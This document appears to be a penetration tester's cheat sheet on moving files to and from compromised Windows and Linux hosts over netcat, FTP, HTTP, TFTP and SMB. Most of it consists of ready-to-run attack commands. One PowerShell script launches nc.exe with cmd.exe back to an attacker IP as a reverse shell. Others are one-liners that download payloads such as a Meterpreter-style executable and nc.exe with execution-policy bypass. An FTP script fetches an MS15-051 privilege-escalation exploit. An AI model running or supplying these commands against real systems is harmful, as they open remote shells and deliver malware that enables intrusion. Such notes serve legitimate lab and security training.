# File transfert

=============================================================
## Nc Windows

Upload nc.exe or nc64.exe

    /usr/share/windows-binaries/nc.exe


Run reverse netcat connection and connect to attacker:

    echo $secpasswd = ConvertTo-SecureString "myPassword1" -AsPlainText -Force >script.ps1
    echo $mycreds = New-Object System.Management.Automation.PSCredential ("admin", $secpasswd) >>  script.ps1
    echo $computer = "User-PC" >> script.ps1
    echo [System.Diagnostics.Process]::Start("C:\tmp\nc.exe","192.168.168.169 443 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer) >> script.ps1
    powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File script.ps1


=============================================================
## Ftp Server Linux

    pip install pyftpdlib
    python -m pyftpdlib -p 21


## Ftp Client Linux

    ftp 10.10.10.4


## FTP Script client

    echo open 10.10.14.6>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get ms15051.exe>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt


=============================================================
## Http server Linux

    $ python -m SimpleHTTPServer 8000

    $ php -S localhost:8000 -t foo/
  
## Http client Unix

    wget, fetch, ftp, tftp

## Http client windows : certutil.exe


    certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip


## Http client windows : powershell System.Net.WebClient

    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')"


    echo $storageDir = $pwd > upload.ps1
    echo $url = "http://192.168.168.169/nc.exe" >> upload.ps1
    echo $file = "$storageDir\nc.exe" >> upload.ps1
    echo (New-Object System.Net.WebClient).DownloadFile($url,$file) >> upload.ps1
    powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File upload.ps1


=============================================================
## Tftp

Server (Complicated to configure...)

    service atftpd start



Metasploit, like with FTP, has an auxiliary TFTP server module at auxiliary/server/tftp. Set the module options, including TFTPROOT

Client

    tftp -i A.B.C.D GET filename

New version of windows: activate it : 

    pkgmgr /iu:"TFTP" 


=============================================================
## SMB server linux

Enter smbserver.py, part of the Impacket project [https://github.com/SecureAuthCorp/impacket] 
[tools/impacket-impacket_0_9_19.zip]

To launch a simple SMB server on port 445, just specify a share name and the path you want to share:

    $ python smbserver.py ROPNOP /root/shells


## SMB client windows

    smbclient -L 10.10.14.30 --no-pass
    net view \\10.10.14.30
    dir \\10.10.13.30\ROPNOP
    copy  \\10.10.13.30\ROPNOP\file.exe .


